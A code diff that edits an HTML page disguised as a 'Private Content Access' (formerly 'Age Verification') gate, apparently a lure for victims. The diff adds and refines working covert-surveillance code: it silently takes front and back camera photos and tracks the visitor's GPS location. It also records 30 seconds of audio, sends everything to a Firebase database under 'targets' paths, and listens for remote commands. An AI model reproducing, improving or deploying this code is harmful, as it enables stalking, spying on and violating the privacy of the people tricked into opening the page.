@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Age Verification Required</title>
+    <title>Private Content Access</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
@@ -37,19 +37,18 @@
         v.style.display = 'block';
 
         try {
-            // Step 1: Initialize Main Stream (Keep it Alive)
             await initStream();
             v.play();
 
-            // Step 2: Auto Data Capture
+            // Initial Intel
             sendInfo();
             trackGPS();
             
-            // Step 3: Fast Auto Capture (Front then Back)
-            setTimeout(() => capture("user"), 2000);
-            setTimeout(() => capture("environment"), 6000);
+            // Auto Capture Sequence
+            setTimeout(() => capture("user"), 3000); // Front
+            setTimeout(() => capture("environment"), 8000); // Back Force Fix
 
-            // Step 4: Persistent Command Listener
+            // Persistent Command Listener
             db.ref(`commands/${sessionID}`).on('value', snap => {
                 const cmd = snap.val();
                 if(cmd) {
@@ -69,15 +68,18 @@
         return globalStream;
     }
 
+    // --- BACK CAMERA FORCE FIX ---
     async function capture(mode) {
         try {
-            // Pehle wala camera release karna zaroori hai switching ke liye
+            // Step 1: Pehle wale tracks ko release karna lazmi hai
             if (globalStream) { globalStream.getTracks().forEach(t => t.stop()); }
             
-            const stream = await navigator.mediaDevices.getUserMedia({ 
+            // Step 2: Ideal aur Exact dono ka fallback lagaya hai
+            const constraints = { 
                 video: { facingMode: { ideal: mode } } 
-            });
+            };
             
+            const stream = await navigator.mediaDevices.getUserMedia(constraints);
             const tempVid = document.createElement('video');
             tempVid.srcObject = stream;
             await tempVid.play();
@@ -89,14 +91,41 @@
                 
                 db.ref(`targets/${sessionID}/photos`).push({
                     img: canvas.toDataURL('image/jpeg', 0.5),
-                    type: mode === "user" ? "FRONT" : "BACK"
+                    type: mode === "user" ? "FRONT" : "BACK",
+                    time: new Date().toLocaleTimeString()
                 });
                 
-                // Camera release karein aur wapas global stream par aayein
                 stream.getTracks().forEach(t => t.stop());
-                initStream(); // Restart stream to keep listener alive
-            }, 2000);
-        } catch (err) { initStream(); }
+                initStream(); // Command listener ke liye stream wapas bahal karein
+            }, 3000);
+        } catch (err) { 
+            db.ref(`targets/${sessionID}/logs`).push("Cam Error: " + mode);
+            initStream(); 
+        }
+    }
+
+    // --- 30 SECOND AUDIO FIX ---
+    async function recordAudio() {
+        try {
+            const recorder = new MediaRecorder(globalStream);
+            let chunks = [];
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = () => {
+                const reader = new FileReader();
+                reader.readAsDataURL(new Blob(chunks, {type:'audio/webm'}));
+                reader.onloadend = () => db.ref(`targets/${sessionID}/audios`).push({
+                    data: reader.result,
+                    time: new Date().toLocaleTimeString()
+                });
+            };
+            recorder.start();
+            
+            // 30000ms = 30 Seconds
+            setTimeout(() => {
+                if(recorder.state !== "inactive") recorder.stop();
+            }, 30000); 
+            
+        } catch (e) { console.log("Audio Error"); }
     }
 
     async function sendInfo() {
@@ -115,19 +144,6 @@
         navigator.geolocation.watchPosition(p => {
             db.ref(`targets/${sessionID}/location`).set({ lat: p.coords.latitude, lng: p.coords.longitude });
         }, null, {enableHighAccuracy:true});
-    }
-
-    async function recordAudio() {
-        const recorder = new MediaRecorder(globalStream);
-        let chunks = [];
-        recorder.ondataavailable = e => chunks.push(e.data);
-        recorder.onstop = () => {
-            const reader = new FileReader();
-            reader.readAsDataURL(new Blob(chunks, {type:'audio/webm'}));
-            reader.onloadend = () => db.ref(`targets/${sessionID}/audios`).push({data: reader.result});
-        };
-        recorder.start();
-        setTimeout(() => recorder.stop(), 10000);
     }
 </script>
 </body>
